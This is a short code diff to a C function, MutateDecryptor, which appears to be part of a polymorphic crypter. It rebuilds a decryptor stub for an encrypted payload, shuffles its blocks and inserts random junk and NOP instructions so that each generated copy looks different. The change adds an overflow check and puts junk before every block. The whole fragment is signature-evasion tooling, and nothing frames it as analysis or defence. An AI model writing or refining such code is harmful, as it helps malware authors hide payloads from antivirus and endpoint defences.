@@ -446,11 +446,11 @@ BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
   if (originalStubSize < 8 ||
       DecryptorStubBegin[TMPL_BLOCK_B_OFF] != 0xBA ||
       DecryptorStubBegin[TMPL_BLOCK_C_OFF] != 0x45) {
-      HeapFree(GetProcessHeap(), 0, NULL); /* no-op, just symmetrical with alloc path */
       return FALSE; /* Template mismatch — update TMPL_BLOCK_*_OFF constants */
   }
 
   SIZE_T maxStubSize = originalStubSize * 4 + 256;
+  if (payloadLen > (SIZE_T)-1 - maxStubSize) return FALSE;
   SIZE_T bufSize = maxStubSize + payloadLen;
   BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize);
   if (!buf)
@@ -516,11 +516,8 @@ BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
   for (int i = 0; i < 4; i++) {
     int idx = order[i];
 
-    /* Insert junk before the block (except the first one) */
-    if (i > 0) {
-      pos = InsertRandomJunk(buf, pos);
-      pos = InsertRandomNop(buf, pos);
-    }
+    pos = InsertRandomJunk(buf, pos);
+    pos = InsertRandomNop(buf, pos);
 
     /* Remember the offset of imm32 inside Block B */
     if (idx == 0) {
